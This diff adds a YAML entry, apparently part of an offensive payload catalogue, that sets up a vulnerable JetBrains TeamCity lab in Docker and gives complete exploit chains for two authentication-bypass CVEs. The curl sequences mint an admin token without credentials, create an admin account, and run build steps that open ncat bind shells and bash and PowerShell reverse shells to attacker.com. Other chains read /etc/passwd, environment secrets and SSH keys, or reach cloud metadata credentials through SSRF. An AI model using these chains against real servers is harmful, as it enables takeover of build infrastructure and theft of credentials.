@@ -1,0 +1,254 @@
+---
+comment: |
+  JetBrains TeamCity is a Java-based CI/CD server. Two critical authentication bypass
+  vulnerabilities have CISA KEV status:
+
+  1. CVE-2023-42793 (CVSS 9.8, CISA KEV): The /app/rest/users/id:1/tokens/RPC2 endpoint
+     accepts unauthenticated POST requests and creates an API token for the administrator
+     account (user id:1). The token grants full REST API access, enabling admin account
+     creation, project/build manipulation, and OS command execution via a build runner.
+     Affects TeamCity before 2023.05.4.
+
+  2. CVE-2024-27198 (CVSS 9.8, CISA KEV): Authentication bypass via servlet path traversal
+     using a semicolon suffix (e.g., /app/rest/users;.jsp). Allows unauthenticated creation
+     of administrator accounts. Affects TeamCity before 2023.11.4 and before 2024.03.
+
+  Build steps run on the TeamCity Build Agent. In default/lab deployments the agent shares
+  the same host as the server. In production, agents may be on separate machines.
+docker:
+  compose: "services:\n  teamcity:\n    image: jetbrains/teamcity-server:2023.05.3\n\
+    \    ports:\n      - \"8111:8111\"\n    volumes:\n      - teamcity_data:/data/teamcity_server/datadir\n\
+    \      - teamcity_logs:/opt/teamcity/logs\n  teamcity-agent:\n    image: jetbrains/teamcity-agent:2023.05.3\n\
+    \    environment:\n      SERVER_URL: http://teamcity:8111\n    depends_on:\n \
+    \     - teamcity\nvolumes:\n  teamcity_data:\n  teamcity_logs:\n"
+  note: "Starts TeamCity 2023.05.3 (vulnerable to CVE-2023-42793 unauthenticated auth\
+    \ bypass).\nAccess at `http://localhost:8111`. On first visit, accept the license\
+    \ and complete\nminimal setup (skip agent configuration). The REST API is active\
+    \ immediately.\nRun `docker compose up -d && sleep 30` before sending requests.\n\
+    Download the built-in agent token-creation PoC:\n  curl -s -X POST http://localhost:8111/app/rest/users/id:1/tokens/RPC2\n"
+functions:
+  bind-shell:
+  - blind: true
+    code: |
+      # CVE-2023-42793: bind shell via Command Line build step (Linux agent)
+      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
+        -H "Content-Type: application/json" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+
+      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"b","id":"b","parentProject":{"locator":"_Root"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"b","id":"B_B","project":{"id":"b"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:B_B/steps" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"type":"simpleRunner","name":"bs","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"ncat -lvp 12345 -e /bin/sh &"}]}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"buildType":{"id":"B_B"}}'
+    comment: |
+      CVE-2023-42793: opens a bind shell on TCP 12345 via a build step using ncat.
+      The trailing & prevents the build step from blocking. Connect with: nc victim.com 12345
+      Requires ncat (nmap package) on the agent host.
+    connector: tcp-client
+    contexts:
+      unauthenticated:
+    platform: linux
+    tty: false
+    version: |
+      < 2023.05.4
+  file-read:
+  - code: |
+      # Read server-side files via a build step that uploads output as an artifact
+      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
+        -H "Content-Type: application/json" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+
+      # Create project and build type with file-read step and artifact rule
+      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"fr","id":"fr","parentProject":{"locator":"_Root"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"fr","id":"Fr_Fr","project":{"id":"fr"},"settings":{"property":[{"name":"artifactRules","value":"output.txt"}]}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:Fr_Fr/steps" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"type":"simpleRunner","name":"read","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"cat /etc/passwd > output.txt\ncat /proc/1/environ >> output.txt"}]}}'
+
+      BUILD_ID=$(curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"buildType":{"id":"Fr_Fr"}}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+
+      sleep 8
+      # Download the artifact
+      curl -s "http://victim.com:8111/app/rest/builds/id:${BUILD_ID}/artifacts/content/output.txt" \
+        -H "Authorization: Bearer $TOKEN"
+    comment: |
+      CVE-2023-42793: exfiltrates files from the agent host by running a build step that
+      writes file content to a build artifact. Artifacts are downloadable via the REST API
+      without the build step needing network access to the attacker.
+      Valuable agent-side files:
+      - /etc/passwd, /proc/1/environ (host info, credentials in environment)
+      - ~/.ssh/id_rsa (SSH keys of the agent user)
+      - TeamCity agent config: /opt/buildagent/conf/buildAgent.properties (server URL, auth token)
+    contexts:
+      unauthenticated:
+    version: |
+      < 2023.05.4
+  rce:
+  - code: "# CVE-2023-42793: auth bypass \u2192 admin token \u2192 RCE via build runner\n\
+      \n# Step 1: create an admin API token without authentication\nTOKEN=$(curl -s\
+      \ -X POST \"http://victim.com:8111/app/rest/users/id:1/tokens/RPC2\" \\\n  -H\
+      \ \"Content-Type: application/json\" \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['value'])\"\
+      )\necho \"[*] Token: $TOKEN\"\n\n# Step 2: create a project\ncurl -s -X POST\
+      \ \"http://victim.com:8111/app/rest/projects\" \\\n  -H \"Authorization: Bearer\
+      \ $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"\
+      exploit\",\"id\":\"exploit\",\"parentProject\":{\"locator\":\"_Root\"}}'\n\n\
+      # Step 3: create a build configuration under the project\ncurl -s -X POST \"\
+      http://victim.com:8111/app/rest/buildTypes\" \\\n  -H \"Authorization: Bearer\
+      \ $TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\":\"\
+      pwn\",\"id\":\"Exploit_Pwn\",\"project\":{\"id\":\"exploit\"}}'\n\n# Step 4:\
+      \ add a Command Line build step with an OS command\ncurl -s -X POST \"http://victim.com:8111/app/rest/buildTypes/id:Exploit_Pwn/steps\"\
+      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\"\
+      \ \\\n  -d '{\"type\":\"simpleRunner\",\"name\":\"cmd\",\"properties\":{\"property\"\
+      :[{\"name\":\"use.custom.script\",\"value\":\"true\"},{\"name\":\"script.content\"\
+      ,\"value\":\"id\\nhostname\\nenv\"}]}}'\n\n# Step 5: trigger the build and poll\
+      \ for output\nBUILD_ID=$(curl -s -X POST \"http://victim.com:8111/app/rest/buildQueue\"\
+      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\"\
+      \ \\\n  -d '{\"buildType\":{\"id\":\"Exploit_Pwn\"}}' \\\n  | python3 -c \"\
+      import sys,json; print(json.load(sys.stdin)['id'])\")\n\nsleep 5\ncurl -s \"\
+      http://victim.com:8111/app/rest/builds/id:${BUILD_ID}/log\" \\\n  -H \"Authorization:\
+      \ Bearer $TOKEN\"\n"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-42793:\
+      \ the token-creation endpoint for user id:1 does not enforce\nauthentication,\
+      \ returning a valid admin Bearer token in the response JSON.\nThe build step\
+      \ runs as the TeamCity Build Agent OS user on the agent host.\nIn default lab\
+      \ setups the agent is co-located with the server.\nRef: https://www.exploit-db.com/exploits/51884\n\
+      Metasploit: use exploit/multi/http/jetbrains_teamcity_rce_cve_2023_42793\nnuclei:\
+      \ CVE-2023-42793\n"
+    contexts:
+      unauthenticated:
+    version: |
+      < 2023.05.4
+  - code: "# CVE-2024-27198: auth bypass via semicolon path traversal \u2192 create\
+      \ admin user\n# Step 1: create an administrator account without authentication\n\
+      curl -s -X POST \"http://victim.com:8111/app/rest/users;.jsp\" \\\n  -H \"Content-Type:\
+      \ application/json\" \\\n  -d '{\"username\":\"hacker\",\"password\":\"H@ck3r1!\"\
+      ,\"email\":\"h@x.com\",\"roles\":{\"role\":[{\"roleId\":\"SYSTEM_ADMIN\",\"\
+      scope\":\"g\"}]}}'\n\n# Step 2: use the new admin account to trigger RCE via\
+      \ build runner (same steps as above)\ncurl -s -X POST \"http://victim.com:8111/app/rest/buildTypes\"\
+      \ \\\n  -u \"hacker:H@ck3r1!\" \\\n  -H \"Content-Type: application/json\" \\\
+      \n  -d '{\"name\":\"pwn\",\"id\":\"pwn2\",\"project\":{\"id\":\"_Root\"}}'\n"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2024-27198:\
+      \ The TeamCity REST API does not properly reject requests where\nthe path contains\
+      \ a semicolon suffix (;.jsp). The servlet container strips the\nsuffix before\
+      \ routing but the authentication check uses the original path,\ncreating a bypass.\
+      \ POST to /app/rest/users;.jsp creates an admin account.\nAfter account creation,\
+      \ use the same build-runner RCE chain as CVE-2023-42793.\nRef: https://www.rapid7.com/blog/post/2024/03/04/cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/\n\
+      nuclei: CVE-2024-27198\n"
+    contexts:
+      unauthenticated:
+    version: |
+      < 2023.11.4 / < 2024.03
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2023-42793: reverse shell via Command Line build step
+      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
+        -H "Content-Type: application/json" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+
+      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"s","id":"s","parentProject":{"locator":"_Root"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"s","id":"S_S","project":{"id":"s"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:S_S/steps" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"type":"simpleRunner","name":"rs","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"bash -i >& /dev/tcp/attacker.com/12345 0>&1"}]}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"buildType":{"id":"S_S"}}'
+    comment: |
+      CVE-2023-42793: spawns a reverse bash shell via a Command Line build step.
+      The shell runs as the TeamCity Build Agent OS user on the agent host.
+      The build log will show the step as running until the connection is dropped.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      < 2023.05.4
+  - blind: true
+    code: |
+      # CVE-2023-42793: PowerShell reverse shell via Command Line build step (Windows agent)
+      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
+        -H "Content-Type: application/json" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+
+      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"s","id":"sw","parentProject":{"locator":"_Root"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"sw","id":"Sw_Sw","project":{"id":"sw"}}'
+
+      PS='$c=New-Object Net.Sockets.TCPClient("attacker.com",12345);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:Sw_Sw/steps" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d "{\"type\":\"simpleRunner\",\"name\":\"rs\",\"properties\":{\"property\":[{\"name\":\"use.custom.script\",\"value\":\"true\"},{\"name\":\"script.content\",\"value\":\"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\\"${PS}\\\"\"}]}}"
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"buildType":{"id":"Sw_Sw"}}'
+    comment: |
+      CVE-2023-42793: PowerShell reverse shell via Command Line build step on Windows agents.
+      Uses the same token-creation bypass as the Linux variant.
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: windows
+    tty: false
+    version: |
+      < 2023.05.4
+  ssrf:
+  - code: "# Configure a VCS root with an internal URL \u2014 TeamCity fetches it\
+      \ server-side\nTOKEN=$(curl -s -X POST \"http://victim.com:8111/app/rest/users/id:1/tokens/RPC2\"\
+      \ \\\n  -H \"Content-Type: application/json\" \\\n  | python3 -c \"import sys,json;\
+      \ print(json.load(sys.stdin)['value'])\")\n\ncurl -s -X POST \"http://victim.com:8111/app/rest/vcs-roots\"\
+      \ \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -H \"Content-Type: application/json\"\
+      \ \\\n  -d '{\n    \"name\": \"probe\",\n    \"vcsName\": \"jetbrains.git\"\
+      ,\n    \"project\": {\"id\": \"_Root\"},\n    \"properties\": {\"property\"\
+      : [\n      {\"name\": \"url\", \"value\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\
+      },\n      {\"name\": \"authMethod\", \"value\": \"ANONYMOUS\"}\n    ]}\n  }'\n\
+      \n# Trigger a VCS check \u2014 TeamCity attempts to connect to the URL server-side:\n\
+      curl -s \"http://victim.com:8111/app/rest/vcs-roots/name:probe/repositoryState\"\
+      \ \\\n  -H \"Authorization: Bearer $TOKEN\"\n"
+    comment: |
+      TeamCity fetches VCS root URLs server-side when checking repository state.
+      Supplying an internal URL causes the TeamCity server to make an outbound HTTP
+      request to the target. Error messages or connection timeout differences leak
+      whether the internal host is reachable (semi-blind SSRF).
+      Cloud metadata endpoints:
+      - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      - GCP:        http://metadata.google.internal/computeMetadata/v1/
+      - Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    contexts:
+      unauthenticated:
+    version: |
+      < 2023.05.4
+...
